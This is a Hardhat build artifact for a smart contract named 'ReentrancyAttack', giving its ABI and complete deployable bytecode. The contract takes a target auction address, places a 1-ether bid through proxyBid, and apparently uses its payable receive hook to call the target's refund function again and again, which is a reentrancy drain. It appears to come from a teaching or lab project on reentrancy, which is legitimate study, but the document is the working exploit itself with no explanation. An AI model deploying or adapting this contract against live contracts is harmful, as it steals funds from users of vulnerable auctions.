{
  "_format": "hh-sol-artifact-1",
  "contractName": "ReentrancyAttack",
  "sourceName": "contracts/Reentrancy.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_auction",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "currentBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "proxyBid",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161055e38038061055e8339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b600081519050610087816100e8565b92915050565b60006020828403121561009f57600080fd5b60006100ad84828501610078565b91505092915050565b60006100c1826100c8565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6100f1816100b6565b81146100fc57600080fd5b50565b6104508061010e6000396000f3fe6080604052600436106100385760003560e01c80630aa8c871146101715780639e5faafc1461017b578063ce845d1d146101925761016c565b3661016c57670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ce845d1d6040518163ffffffff1660e01b815260040160206040518083038186803b1580156100ac57600080fd5b505afa1580156100c0573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100e49190610329565b1061016a5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663590e1ae36040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561015157600080fd5b505af1158015610165573d6000803e3d6000fd5b505050505b005b600080fd5b6101796101bd565b005b34801561018757600080fd5b5061019061028a565b005b34801561019e57600080fd5b506101a761030c565b6040516101b491906103a4565b60405180910390f35b670de0b6b3a76400003414610207576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101fe90610384565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631998aeef346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561026f57600080fd5b505af1158015610283573d6000803e3d6000fd5b5050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663590e1ae36040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102f257600080fd5b505af1158015610306573d6000803e3d6000fd5b50505050565b600047905090565b60008151905061032381610403565b92915050565b60006020828403121561033b57600080fd5b600061034984828501610314565b91505092915050565b600061035f6009836103bf565b915061036a826103da565b602082019050919050565b61037e816103d0565b82525050565b6000602082019050818103600083015261039d81610352565b9050919050565b60006020820190506103b96000830184610375565b92915050565b600082825260208201905092915050565b6000819050919050565b7f696e636f72726563740000000000000000000000000000000000000000000000600082015250565b61040c816103d0565b811461041757600080fd5b5056fea264697066735822122010f39f75ebc4dc07663950ccb9bfdd3a5c0cd425bb06768da98a7310fde5fe1664736f6c63430008040033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}